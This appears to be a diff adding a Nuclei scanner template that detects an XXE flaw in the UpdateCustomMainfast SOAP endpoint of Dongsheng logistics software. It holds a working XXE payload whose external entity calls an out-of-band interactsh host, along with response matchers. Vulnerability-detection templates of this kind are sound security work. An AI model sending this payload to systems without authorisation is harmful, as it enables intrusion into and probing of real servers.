@@ -1,0 +1,40 @@
+id: poc-yaml-dongshengsoft-updatecustommainfast-xxe
+info:
+  name: 东胜物流软件 UpdateCustomMainfast XXE漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: DNSLOG,xxe
+http:
+  - raw:
+      - |
+        POST /Webservice/DsWebService.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/soap+xml;charset=UTF-8;action="DsWebService/UpdateCustomMainfast"
+
+        <soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:dsw="DsWebService">
+           <soap:Header/>
+           <soap:Body>
+              <dsw:UpdateCustomMainfast>
+                 <dsw:Xdoc><![CDATA[<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://{{interactsh-url}}">]><test>&xxe;</test>]]></dsw:Xdoc>
+                 <dsw:XdocAfter>1</dsw:XdocAfter>
+                 <dsw:Corpid>1</dsw:Corpid>
+                 <dsw:SenderOp>1</dsw:SenderOp>
+                 <dsw:SenderHandphone>1</dsw:SenderHandphone>
+                 <dsw:SenderEmail>1</dsw:SenderEmail>
+                 <dsw:SenderFax>1</dsw:SenderFax>
+                 <dsw:Mblno>1</dsw:Mblno>
+              </dsw:UpdateCustomMainfast>
+           </soap:Body>
+        </soap:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code == 200"
+          - "contains(http_body, 'DsWebService')"
+          - "contains(http_body, 'System.Net.WebException')"
+          - "contains(http_content_type, 'application/soap+xml')"
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
